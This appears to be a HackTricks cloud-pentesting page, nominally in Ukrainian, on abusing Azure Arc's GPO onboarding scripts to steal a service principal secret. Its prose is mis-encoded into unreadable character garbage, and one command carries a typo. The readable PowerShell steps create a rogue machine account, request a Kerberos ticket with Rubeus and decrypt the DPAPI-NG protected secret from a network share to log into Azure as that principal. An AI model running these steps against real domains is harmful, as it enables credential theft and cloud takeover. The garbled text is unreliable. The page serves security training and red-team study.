# Az - –í—Ä–∞–∑–ª–∏–≤–∏–π —Å—Ü–µ–Ω–∞—Ä—ñ–π —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è GPO Azure Arc

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –≤–ø—Ä–∞–≤–ª—è–π—Ç–µ—Å—å –≤ —Ö–∞–∫—ñ–Ω–≥—É AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**–®–∫–æ–ª–∞ —Ö–∞–∫—ñ–Ω–≥—É HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –≤–ø—Ä–∞–≤–ª—è–π—Ç–µ—Å—å –≤ —Ö–∞–∫—ñ–Ω–≥—É GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**–®–∫–æ–ª–∞ —Ö–∞–∫—ñ–Ω–≥—É HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

### –í–∏—è–≤–ª–µ–Ω–Ω—è –ø—Ä–æ–±–ª–µ–º

Azure Arc –¥–æ–∑–≤–æ–ª—è—î —ñ–Ω—Ç–µ–≥—Ä—É–≤–∞—Ç–∏ –Ω–æ–≤—ñ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∏ (—Å–µ—Ä–≤–µ—Ä–∏, –ø—Ä–∏—î–¥–Ω–∞–Ω—ñ –¥–æ –¥–æ–º–µ–Ω—É) –≤ Azure Arc –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –º–µ—Ç–æ–¥—É –æ–±'—î–∫—Ç–∞ –ø–æ–ª—ñ—Ç–∏–∫–∏ –≥—Ä—É–ø–∏. –î–ª—è —Å–ø—Ä–æ—â–µ–Ω–Ω—è —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É Microsoft –Ω–∞–¥–∞—î –Ω–∞–±—ñ—Ä –∑–∞—Å–æ–±—ñ–≤ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è, –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π –¥–ª—è —ñ–Ω—ñ—Ü—ñ—é–≤–∞–Ω–Ω—è –ø—Ä–æ—Ü–µ–¥—É—Ä–∏ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è. –£ —Ñ–∞–π–ª—ñ ArcEnableServerGroupPolicy.zip –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Å—Ü–µ–Ω–∞—Ä—ñ—ó: DeployGPO.ps1, EnableAzureArc.ps1 —Ç–∞ AzureArcDeployment.psm1.

–ü—Ä–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ —Å—Ü–µ–Ω–∞—Ä—ñ—é DeployGPO.ps1 –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω—ñ –¥—ñ—ó:

1. –°—Ç–≤–æ—Ä—é—î—Ç—å—Å—è GPO –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è —Å–µ—Ä–≤–µ—Ä—ñ–≤ Azure Arc –≤ –ª–æ–∫–∞–ª—å–Ω–æ–º—É –¥–æ–º–µ–Ω—ñ.
2. –ö–æ–ø—ñ—é—î—Ç—å—Å—è —Å—Ü–µ–Ω–∞—Ä—ñ–π –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è EnableAzureArc.ps1 –Ω–∞ –≤–∏–∑–Ω–∞—á–µ–Ω—É –º–µ—Ä–µ–∂–µ–≤—É –ø–∞–ø–∫—É, —Å—Ç–≤–æ—Ä–µ–Ω—É –¥–ª—è –ø—Ä–æ—Ü–µ—Å—É –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è, —è–∫–∞ —Ç–∞–∫–æ–∂ –º—ñ—Å—Ç–∏—Ç—å –ø–∞–∫–µ—Ç –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è Windows.

–ü—Ä–∏ –∑–∞–ø—É—Å–∫—É —Ü—å–æ–≥–æ —Å—Ü–µ–Ω–∞—Ä—ñ—é —Å–∏—Å—Ç–µ–º–Ω–∏–º –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–¥–∞—Ç–∏ –¥–≤–∞ –æ—Å–Ω–æ–≤–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏: **ServicePrincipalId** —Ç–∞ **ServicePrincipalClientSecret**. –ö—Ä—ñ–º —Ç–æ–≥–æ, –≤—ñ–Ω –≤–∏–º–∞–≥–∞—î —ñ–Ω—à–∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ –¥–æ–º–µ–Ω, FQDN —Å–µ—Ä–≤–µ—Ä–∞, –Ω–∞ —è–∫–æ–º—É —Ä–æ–∑–º—ñ—â–µ–Ω–∞ –ø–∞–ø–∫–∞, —Ç–∞ –Ω–∞–∑–≤–∞ –ø–∞–ø–∫–∏. –î–æ–¥–∞—Ç–∫–æ–≤—ñ –≤—ñ–¥–æ–º–æ—Å—Ç—ñ, —Ç–∞–∫—ñ —è–∫ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –æ—Ä–µ–Ω–¥–∞—Ä–∞, –≥—Ä—É–ø–∞ —Ä–µ—Å—É—Ä—Å—ñ–≤ —Ç–∞ —ñ–Ω—à–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è, —Ç–∞–∫–æ–∂ –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –Ω–∞–¥–∞–Ω—ñ —Å—Ü–µ–Ω–∞—Ä—ñ—é.

–ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è DPAPI-NG –≤ –∫–∞—Ç–∞–ª–æ–∑—ñ AzureArcDeploy –Ω–∞ –≤–∫–∞–∑–∞–Ω—ñ–π –ø–∞–ø—Ü—ñ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π —Å–µ–∫—Ä–µ—Ç, —è–∫–∏–π –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ —Ñ–∞–π–ª—ñ –∑ –Ω–∞–∑–≤–æ—é encryptedServicePrincipalSecret. –î–æ–∫–∞–∑–æ–º —Ü—å–æ–≥–æ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ —Å—Ü–µ–Ω–∞—Ä—ñ—ó DeployGPO.ps1, –¥–µ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–∏–∫–ª–∏–∫—É ProtectBase64 –∑ $descriptor —Ç–∞ $ServicePrincipalSecret —è–∫ –≤—Ö—ñ–¥–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏. –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Å–∫–ª–∞–¥–∞—î—Ç—å—Å—è –∑ SID –≥—Ä—É–ø Domain Computer —Ç–∞ Domain Controller, —â–æ –∑–∞–±–µ–∑–ø–µ—á—É—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è ServicePrincipalSecret –ª–∏—à–µ –≥—Ä—É–ø–∞–º–∏ –±–µ–∑–ø–µ–∫–∏ Domain Controllers —Ç–∞ Domain Computers, —è–∫ –≤–∫–∞–∑–∞–Ω–æ –≤ –∫–æ–º–µ–Ω—Ç–∞—Ä—è—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—é.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è

–ú–∞—î–º–æ –Ω–∞—Å—Ç—É–ø–Ω—ñ —É–º–æ–≤–∏:

1. –ú–∏ —É—Å–ø—ñ—à–Ω–æ –ø—Ä–æ–Ω–∏–∫–ª–∏ –≤–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—é –º–µ—Ä–µ–∂—É.
2. –ú–∏ –º–∞—î–º–æ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∞–±–æ –ø—Ä–∏–ø—É—Å—Ç–∏—Ç–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º –∫–æ–º–ø'—é—Ç–µ—Ä–∞ –≤ –º–µ–∂–∞—Ö Active Directory.
3. –ú–∏ –≤–∏—è–≤–∏–ª–∏ –º–µ—Ä–µ–∂–µ–≤–∏–π —Ä–µ—Å—É—Ä—Å, —â–æ –º—ñ—Å—Ç–∏—Ç—å –∫–∞—Ç–∞–ª–æ–≥ AzureArcDeploy.

–Ü—Å–Ω—É—î –∫—ñ–ª—å–∫–∞ –º–µ—Ç–æ–¥—ñ–≤ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –º–∞—à–∏–Ω–∏ –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ AD. –û–¥–∏–Ω –∑ –Ω–∞–π–ø–æ—à–∏—Ä–µ–Ω—ñ—à–∏—Ö - —Ü–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∫–≤–æ—Ç–∏ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –º–∞—à–∏–Ω–∏. –©–µ –æ–¥–∏–Ω –º–µ—Ç–æ–¥ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—é –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –º–∞—à–∏–Ω–∏ —á–µ—Ä–µ–∑ –≤—Ä–∞–∑–ª–∏–≤—ñ ACL –∞–±–æ —Ä—ñ–∑–Ω–æ–º–∞–Ω—ñ—Ç–Ω—ñ —ñ–Ω—à—ñ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
–ü—ñ—Å–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –º–∞—à–∏–Ω–∏ –º–æ–∂–ª–∏–≤–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü—å–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É. –ú–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É runas.exe –∑ –ø—Ä–∞–ø–æ—Ä—Ü–µ–º netonly –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ pass-the-ticket –∑ Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
–ó–±–µ—Ä—ñ–≥–∞—é—á–∏ TGT –¥–ª—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –Ω–∞—à–æ–≥–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞ –≤ –ø–∞–º'—è—Ç—ñ, –º–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—É –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—É —Å–ª—É–∂–±–∏.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ, –º–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

–ù–∞ —Ü—å–æ–º—É –µ—Ç–∞–ø—ñ –º–∏ –º–æ–∂–µ–º–æ –∑—ñ–±—Ä–∞—Ç–∏ –∑–∞–ª–∏—à–∫–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –Ω–µ–æ–±—Ö—ñ–¥–Ω—É –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ Azure –∑ —Ñ–∞–π–ª—É ArcInfo.json, —è–∫–∏–π –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –Ω–∞ —Ç—ñ–π —Å–∞–º—ñ–π –º–µ—Ä–µ–∂–µ–≤—ñ–π —à–∞—Ä—ñ, —â–æ –π —Ñ–∞–π–ª encryptedServicePrincipalSecret. –¶–µ–π —Ñ–∞–π–ª –º—ñ—Å—Ç–∏—Ç—å –¥–µ—Ç–∞–ª—ñ, —Ç–∞–∫—ñ —è–∫: TenantId, servicePrincipalClientId, ResourceGroup —Ç–∞ —ñ–Ω—à–µ. –ó —Ü—ñ—î—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –º–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ Azure CLI –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —è–∫ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π —Å–µ—Ä–≤—ñ—Å–Ω–∏–π –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)
